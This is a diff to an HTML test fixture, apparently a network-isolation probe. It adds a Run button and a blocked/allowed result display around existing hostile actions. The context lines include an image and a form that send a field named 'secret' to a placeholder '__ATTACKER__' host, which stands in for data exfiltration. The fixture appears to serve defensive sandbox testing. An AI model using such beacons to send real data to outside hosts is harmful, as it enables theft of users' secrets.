@@ -9,6 +9,10 @@
   </style>
 </head>
 <body>
+  <h1>Network probe</h1>
+  <p id="marker">Network fixture ready</p>
+  <button id="run" type="button">Run</button>
+  <p id="result">not-run</p>
   <img src="__ATTACKER__/image" alt="hostile image">
   <form action="__ATTACKER__/form" method="post" target="_self">
     <input type="text" name="secret" value="fictional">
@@ -19,6 +23,13 @@
   <script>
     const attacker = "__ATTACKER__";
     const attempts = [];
+    const result = document.getElementById("result");
+    const setResult = (blocked, errorName = "") => {
+      result.textContent = `${blocked ? "blocked" : "allowed"}:${errorName}`;
+    };
+    document.getElementById("run").addEventListener("click", runHostileActions);
+    function runHostileActions() {
+      result.textContent = "running";
     const record = (name, promise) => {
       attempts.push(name);
       Promise.resolve(promise).catch(() => {});
@@ -83,6 +94,8 @@
       origin: self.origin,
       serviceWorker: navigator.serviceWorker !== undefined,
     };
+      setResult(true);
+    }
   </script>
 </body>
 </html>
